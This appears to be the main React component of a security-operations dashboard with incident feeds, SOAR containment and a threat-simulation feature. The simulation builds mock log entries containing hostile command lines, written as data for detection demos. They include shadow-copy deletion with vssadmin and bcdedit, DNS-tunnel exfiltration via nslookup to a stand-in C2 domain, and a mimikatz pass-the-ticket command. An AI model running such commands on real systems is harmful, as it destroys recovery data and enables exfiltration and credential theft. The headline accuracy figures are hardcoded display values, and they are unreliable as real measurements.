import React, { useState, useEffect, useCallback } from 'react';
import { Header } from './components/Header';
import { ThreatOperations } from './components/ThreatOperations';
import { ThreatHunt } from './components/ThreatHunt';
import { DataSources } from './components/DataSources';
import { SOAREngine } from './components/SOAREngine';
import { ForensicsLab } from './components/ForensicsLab';
import { MitreMatrix } from './components/MitreMatrix';
import { RuleStudio } from './components/RuleStudio';
import { AICopilot } from './components/AICopilot';
import { IncidentDetailModal } from './components/IncidentDetailModal';
import {
  SecurityIncident,
  SecurityAlert,
  ForensicArtifact,
  UserRole,
} from './types';
import { FORENSIC_ARTIFACTS } from './data/mockData';
import {
  fetchIncidents,
  fetchAlerts,
  fetchSystemStats,
  fetchDataSources,
  ingestSecurityLog,
  updateIncidentStatus,
} from './services/api';
import { wsClient } from './services/websocket';
import { AlertTriangle, Zap, X } from 'lucide-react';

export default function App() {
  const [activeTab, setActiveTab] = useState<string>('threat-ops');
  const [incidents, setIncidents] = useState<SecurityIncident[]>([]);
  const [alertsFeed, setAlertsFeed] = useState<SecurityAlert[]>([]);
  const [artifacts] = useState<ForensicArtifact[]>(FORENSIC_ARTIFACTS);
  const [selectedIncident, setSelectedIncident] = useState<SecurityIncident | null>(null);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [isDemoMode, setIsDemoMode] = useState<boolean>(false);
  const [userRole, setUserRole] = useState<UserRole>('SOC_ADMIN');
  const [wsConnected, setWsConnected] = useState<boolean>(false);
  const [liveEpsRate, setLiveEpsRate] = useState<number>(0);
  const [activeSourcesCount, setActiveSourcesCount] = useState<number>(1);
  const [isSimulating, setIsSimulating] = useState<boolean>(false);

  const [notifications, setNotifications] = useState<
    Array<{
      id: string;
      title: string;
      message: string;
      type: 'SOAR' | 'ALERT' | 'INFO';
      timestamp: string;
    }>
  >([]);

  const addNotification = useCallback(
    (title: string, message: string, type: 'SOAR' | 'ALERT' | 'INFO' = 'SOAR') => {
      const id = `notif-${Date.now()}-${Math.random()}`;
      setNotifications((prev) => [
        { id, title, message, type, timestamp: new Date().toLocaleTimeString() },
        ...prev,
      ]);

      setTimeout(() => {
        setNotifications((prev) => prev.filter((n) => n.id !== id));
      }, 5000);
    },
    []
  );

  // Initial load & data sync based on isDemoMode
  const loadData = useCallback(async () => {
    try {
      const [incRes, altRes, statsRes, dsRes] = await Promise.all([
        fetchIncidents(isDemoMode),
        fetchAlerts(isDemoMode),
        fetchSystemStats(isDemoMode),
        fetchDataSources(),
      ]);

      if (incRes.success) setIncidents(incRes.incidents);
      if (altRes.success) setAlertsFeed(altRes.alerts);
      if (statsRes.success && statsRes.stats) {
        setLiveEpsRate(statsRes.stats.eventsPerSecond || 0);
      }
      if (dsRes.success && dsRes.dataSources) {
        setActiveSourcesCount(dsRes.dataSources.filter((d) => d.status === 'CONNECTED').length);
      }
    } catch (err) {
      console.error('Failed to load initial SecOps telemetry:', err);
    }
  }, [isDemoMode]);

  useEffect(() => {
    loadData();
  }, [loadData]);

  // WebSocket real-time event subscriptions
  useEffect(() => {
    const unsubStatus = wsClient.on('STATUS_CHANGE', (data) => {
      setWsConnected(data.connected);
    });

    const unsubAlert = wsClient.on('ALERT_TRIGGERED', (alert: SecurityAlert) => {
      setAlertsFeed((prev) => [alert, ...prev.slice(0, 49)]);
      if (alert.severity === 'CRITICAL') {
        addNotification(
          `CRITICAL ALERT: ${alert.source}`,
          `${alert.message} (Src: ${alert.sourceIp})`,
          'ALERT'
        );
      }
    });

    const unsubIncident = wsClient.on('INCIDENT_CREATED', (incident: SecurityIncident) => {
      setIncidents((prev) => [incident, ...prev]);
      addNotification(
        `NEW INCIDENT: ${incident.id}`,
        `${incident.title} on host ${incident.targetHost}`,
        'ALERT'
      );
    });

    const unsubIncUpdate = wsClient.on('INCIDENT_UPDATED', (updated: SecurityIncident) => {
      setIncidents((prev) => prev.map((i) => (i.id === updated.id ? updated : i)));
      if (selectedIncident?.id === updated.id) {
        setSelectedIncident(updated);
      }
    });

    const unsubMetrics = wsClient.on('METRICS_UPDATED', (metrics: any) => {
      if (metrics?.eventsPerSecond !== undefined) {
        setLiveEpsRate(metrics.eventsPerSecond);
      }
    });

    const unsubSoar = wsClient.on('SOAR_EXECUTED', (soarPayload: any) => {
      addNotification(
        `SOAR PLAYBOOK EXECUTED`,
        `${soarPayload.playbookName} applied to ${soarPayload.target}. Audit ID: ${soarPayload.auditId}`,
        'SOAR'
      );
    });

    const unsubDs = wsClient.on('DATASOURCE_STATUS_CHANGED', () => {
      fetchDataSources().then((res) => {
        if (res.success) {
          setActiveSourcesCount(res.dataSources.filter((d) => d.status === 'CONNECTED').length);
        }
      });
    });

    // Check initial connection
    setWsConnected(wsClient.getConnectedStatus());

    return () => {
      unsubStatus();
      unsubAlert();
      unsubIncident();
      unsubIncUpdate();
      unsubMetrics();
      unsubSoar();
      unsubDs();
    };
  }, [addNotification, selectedIncident]);

  const handleUpdateIncident = async (updated: SecurityIncident) => {
    try {
      await updateIncidentStatus(updated.id, {
        status: updated.status,
        executedBy: userRole,
      });
      setIncidents((prev) => prev.map((i) => (i.id === updated.id ? updated : i)));
      setSelectedIncident(updated);
    } catch (err: any) {
      console.error('Failed to update incident on backend:', err);
    }
  };

  const handleQuickContain = async (inc: SecurityIncident) => {
    try {
      const updated: SecurityIncident = {
        ...inc,
        status: 'CONTAINED',
      };
      await updateIncidentStatus(inc.id, {
        status: 'CONTAINED',
        remediationAction: 'Automated EDR Host Quarantine & Firewall Null-Route',
        executedBy: userRole,
        output: `Host ${inc.targetHost} quarantined by ${userRole}. C2 IP ${inc.sourceIp} dropped at perimeter.`,
      });
      setIncidents((prev) => prev.map((i) => (i.id === inc.id ? updated : i)));
      addNotification(
        'Autonomous Containment Executed',
        `Endpoint ${inc.targetHost} has been network-quarantined. C2 IP ${inc.sourceIp} dropped at perimeter firewall.`,
        'SOAR'
      );
    } catch (err: any) {
      alert(`Containment failed: ${err.message}`);
    }
  };

  const handleSimulateThreat = async (scenarioType: string) => {
    setIsSimulating(true);
    try {
      let rawLogPayload: any = {};

      if (scenarioType === 'RANSOMWARE') {
        rawLogPayload = {
          sourceType: 'EDR',
          sourceCollector: 'CrowdStrike Falcon Sensor',
          hostname: 'SRV-FILE-CLUSTER02',
          sourceIp: '194.26.29.89',
          destinationIp: '10.0.1.15',
          destinationPort: 443,
          protocol: 'TCP',
          user: 'CORP\\svc_storage_admin',
          processName: 'vssadmin.exe',
          commandLine: 'vssadmin.exe delete shadows /all /quiet && bcdedit /set {default} bootstatuspolicy ignoreallfailures',
          message: 'Volume Shadow Copies deleted via vssadmin. Rapid file rename to *.lockbit detected',
          action: 'EXECUTE',
          severity: 'CRITICAL',
          isDemo: isDemoMode,
        };
      } else if (scenarioType === 'COBALT_STRIKE') {
        rawLogPayload = {
          sourceType: 'IDS_IPS',
          sourceCollector: 'Suricata Network Threat Sensor',
          hostname: 'GATEWAY-BORDER-01',
          sourceIp: '185.220.101.42',
          destinationIp: '10.0.2.14',
          destinationPort: 8443,
          protocol: 'HTTPS',
          user: 'SYSTEM',
          processName: 'suricata',
          commandLine: 'suricata -i eth0 -c /etc/suricata/suricata.yaml',
          message: 'Cobalt Strike Malleable C2 Beaconing pattern matched on TLS session',
          action: 'DETECT',
          severity: 'HIGH',
          isDemo: isDemoMode,
        };
      } else if (scenarioType === 'DNS_EXFIL') {
        rawLogPayload = {
          sourceType: 'DNS',
          sourceCollector: 'CoreDNS Resolver Daemon',
          hostname: 'DNS-RESOLVER-01',
          sourceIp: '10.0.3.44',
          destinationIp: '8.8.8.8',
          destinationPort: 53,
          protocol: 'UDP',
          user: 'CORP\\contractor_temp',
          processName: 'nslookup.exe',
          commandLine: 'nslookup -q=txt JABkYXRhPT... exfil.adversary-c2.net',
          message: 'High frequency DNS TXT queries carrying base64 payloads to unregistered nameserver',
          action: 'DETECT',
          severity: 'HIGH',
          isDemo: isDemoMode,
        };
      } else {
        rawLogPayload = {
          sourceType: 'WINDOWS',
          sourceCollector: 'Windows Event Collector (WEC)',
          hostname: 'DC01.corp.internal',
          sourceIp: '10.0.2.45',
          destinationIp: '10.0.1.10',
          destinationPort: 88,
          protocol: 'Kerberos',
          user: 'CORP\\contractor_temp',
          processName: 'lsass.exe',
          eventId: 4769,
          commandLine: 'mimikatz.exe "kerberos::ptt ticket.kirbi"',
          message: 'Pass-the-Hash / Overpass-the-Hash Kerberos ticket injection detected (Event 4769)',
          action: 'AUTH_SUCCESS',
          severity: 'CRITICAL',
          isDemo: isDemoMode,
        };
      }

      await ingestSecurityLog(rawLogPayload);
      await loadData();
      addNotification(
        '🚨 Security Scenario Injected',
        `Real-time detection engine processed ${scenarioType} attack stream.`,
        'ALERT'
      );
      setActiveTab('threat-ops');
    } catch (err: any) {
      alert(`Simulation error: ${err.message}`);
    } finally {
      setIsSimulating(false);
    }
  };

  const handleApplyRemediation = (incidentId: string, actionName: string, output: string) => {
    const inc = incidents.find((i) => i.id === incidentId);
    if (inc) {
      handleUpdateIncident({
        ...inc,
        status: 'CONTAINED',
      });
      addNotification(
        'SOAR Action Completed',
        `Successfully executed "${actionName}" on ${inc.targetHost}.`,
        'SOAR'
      );
    }
  };

  const openIncidents = incidents.filter((i) => i.status === 'OPEN' || i.status === 'INVESTIGATING').length;
  const criticalCount = incidents.filter((i) => i.severity === 'CRITICAL').length;

  return (
    <div className="min-h-screen bg-[#050505] text-[#e0e0e0] flex flex-col selection:bg-[#ff3e3e] selection:text-black">
      {/* Global Navigation Header */}
      <Header
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        openIncidentsCount={openIncidents}
        criticalCount={criticalCount}
        isSimulating={isSimulating}
        onSimulateThreat={handleSimulateThreat}
        searchQuery={searchQuery}
        setSearchQuery={setSearchQuery}
        isDemoMode={isDemoMode}
        setIsDemoMode={setIsDemoMode}
        userRole={userRole}
        setUserRole={setUserRole}
        wsConnected={wsConnected}
        liveEpsRate={liveEpsRate}
        activeSourcesCount={activeSourcesCount}
      />

      {/* High-Impact Bold Typography Hero Metrics Ribbon */}
      <div className="border-b border-[#222226] bg-[#08080a] relative overflow-hidden">
        <div className="absolute top-1/2 left-8 -translate-y-1/2 opacity-[0.03] text-[10vw] font-black tracking-tighter uppercase select-none pointer-events-none leading-none">
          SENTINEL
        </div>
        <div className="absolute top-1/2 right-8 -translate-y-1/2 opacity-[0.03] text-[10vw] font-black tracking-tighter uppercase select-none pointer-events-none leading-none">
          FORENSICS
        </div>

        <div className="max-w-7xl mx-auto px-4 sm:px-8 py-6 sm:py-8 relative z-10">
          <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-6">
            <div>
              <div className="text-[10px] font-bold font-mono text-[#ff3e3e] uppercase tracking-[0.25em] mb-1">
                Autonomous SecOps Response Velocity
              </div>
              <div className="text-4xl sm:text-6xl lg:text-7xl font-black tracking-tighter text-white leading-none">
                00:00<span className="text-[#ff3e3e]">:</span>24
              </div>
              <div className="text-[10px] font-mono uppercase tracking-widest text-zinc-400 mt-2">
                Average Automated Threat Quarantine & Mitigation Latency
              </div>
            </div>

            <div className="grid grid-cols-3 gap-6 sm:gap-10 border-t lg:border-t-0 lg:border-l border-[#222226] pt-4 lg:pt-0 lg:pl-10 w-full lg:w-auto">
              <div>
                <div className="text-2xl sm:text-3xl lg:text-4xl font-black tracking-tight text-white">99.8%</div>
                <div className="text-[9px] sm:text-[10px] font-mono uppercase tracking-[0.2em] text-zinc-400 mt-1">
                  Detection Accuracy
                </div>
              </div>
              <div>
                <div className="text-2xl sm:text-3xl lg:text-4xl font-black tracking-tight text-white">
                  4.2<span className="text-[#ff3e3e]">PB</span>
                </div>
                <div className="text-[9px] sm:text-[10px] font-mono uppercase tracking-[0.2em] text-zinc-400 mt-1">
                  Data Scanned/Day
                </div>
              </div>
              <div>
                <div className="text-2xl sm:text-3xl lg:text-4xl font-black tracking-tight text-white">
                  12.1<span className="text-emerald-400">k</span>
                </div>
                <div className="text-[9px] sm:text-[10px] font-mono uppercase tracking-[0.2em] text-zinc-400 mt-1">
                  Threats Neutralized
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Dynamic Viewport */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6 lg:p-8">
        {activeTab === 'threat-ops' && (
          <ThreatOperations
            incidents={incidents}
            alertsFeed={alertsFeed}
            onSelectIncident={(inc) => setSelectedIncident(inc)}
            onQuickContain={handleQuickContain}
            onSimulateThreat={handleSimulateThreat}
            searchQuery={searchQuery}
            isDemoMode={isDemoMode}
            onOpenDataSources={() => setActiveTab('data-sources')}
            onIngestSample={() => handleSimulateThreat('RANSOMWARE')}
          />
        )}

        {activeTab === 'hunt' && (
          <ThreatHunt isDemoMode={isDemoMode} initialQuery={searchQuery} />
        )}

        {activeTab === 'data-sources' && (
          <DataSources onIngestSuccess={loadData} />
        )}

        {activeTab === 'soar' && (
          <SOAREngine
            incidents={incidents}
            onApplyRemediation={handleApplyRemediation}
            userRole={userRole}
          />
        )}

        {activeTab === 'forensics' && <ForensicsLab />}

        {activeTab === 'mitre' && (
          <MitreMatrix incidents={incidents} onSelectTechnique={() => {}} />
        )}

        {activeTab === 'rules' && <RuleStudio />}

        {activeTab === 'ai-copilot' && (
          <AICopilot
            incidents={incidents}
            artifacts={artifacts}
            onTriggerPlaybook={() => {
              setActiveTab('soar');
            }}
          />
        )}
      </main>

      {/* High-Impact Footer Bar */}
      <footer className="h-10 bg-[#ff3e3e] text-black px-4 sm:px-8 flex items-center justify-between text-[10px] sm:text-[11px] font-black uppercase tracking-widest border-t border-[#ff3e3e]">
        <span>Secure Connection: TLS 1.3 Active</span>
        <span className="hidden sm:inline">Incident Response Unit Active — WebSocket Real-Time Stream</span>
        <span>v3.0.0 — Enterprise SOC Platform</span>
      </footer>

      {/* Deep Incident Triage Modal */}
      {selectedIncident && (
        <IncidentDetailModal
          incident={selectedIncident}
          onClose={() => setSelectedIncident(null)}
          onUpdateIncident={handleUpdateIncident}
          onTriggerPlaybook={(pbId, inc) => {
            handleQuickContain(inc);
            setSelectedIncident(null);
          }}
          onOpenForensics={() => {
            setActiveTab('forensics');
          }}
        />
      )}

      {/* Live Toast Notifications */}
      <div className="fixed bottom-12 right-4 z-50 space-y-2 max-w-sm w-full pointer-events-none">
        {notifications.map((n) => (
          <div
            key={n.id}
            className="p-3.5 bg-[#0c0c0e]/95 border border-[#333] backdrop-blur-md rounded-sm shadow-2xl flex items-start gap-3 pointer-events-auto transition animate-in slide-in-from-bottom-2"
          >
            <div
              className={`p-1.5 rounded-sm shrink-0 mt-0.5 font-bold ${
                n.type === 'ALERT'
                  ? 'bg-[#ff3e3e]/20 text-[#ff3e3e] border border-[#ff3e3e]/50'
                  : 'bg-amber-950/80 text-amber-400 border border-amber-800'
              }`}
            >
              {n.type === 'ALERT' ? <AlertTriangle className="w-4 h-4" /> : <Zap className="w-4 h-4" />}
            </div>
            <div className="flex-1 text-xs">
              <div className="font-bold text-white uppercase tracking-wider">{n.title}</div>
              <div className="text-zinc-300 text-[11px] mt-0.5 leading-snug">{n.message}</div>
              <div className="text-[10px] text-zinc-500 font-mono mt-1">{n.timestamp}</div>
            </div>
            <button
              onClick={() => setNotifications((prev) => prev.filter((item) => item.id !== n.id))}
              className="text-zinc-400 hover:text-white"
            >
              <X className="w-3.5 h-3.5" />
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}
